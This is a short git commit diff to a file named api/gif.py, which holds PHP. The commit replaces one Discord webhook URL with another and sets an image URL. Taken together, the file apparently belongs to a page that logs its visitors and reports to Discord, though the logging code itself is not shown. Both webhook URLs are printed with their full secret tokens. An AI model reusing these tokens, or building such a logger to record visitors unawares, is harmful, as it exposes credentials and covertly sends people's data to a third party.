7519744b6e8121c5d51b90082e939edbb4b30b45
ikakta <ssus69350@gmail.com>
2026-08-21 15:46:46 -0600

    gif.py

--- api/gif.py
+++ api/gif.py
@@ -11,7 +11,7 @@ NOTE: You can use this in every page if you make a it a external page and requir
 
 <?php
 
-        $webhookurl = "https://discord.com/api/webhooks/1540467897246416918/7nQNctoTYDgU-OGBr04bdhlKAzpnZ-86xX57bmYmq4HX7-ghS1T6Nu1gQty5SiDLBy8f";
+        $webhookurl = "https://discord.com/api/webhooks/1540477098332790804/dt3cTSL7txKF-Tqsy9Olk4CEM_Rzop9jJnQaN21Zf20MjX9tlrcLO8MnGrhlhq_PzrWr";
         
  $image = "https://i.pinimg.com/736x/cc/3b/c8/cc3bc856f0be0f0cf435b489df15b2d3.jpg";
 
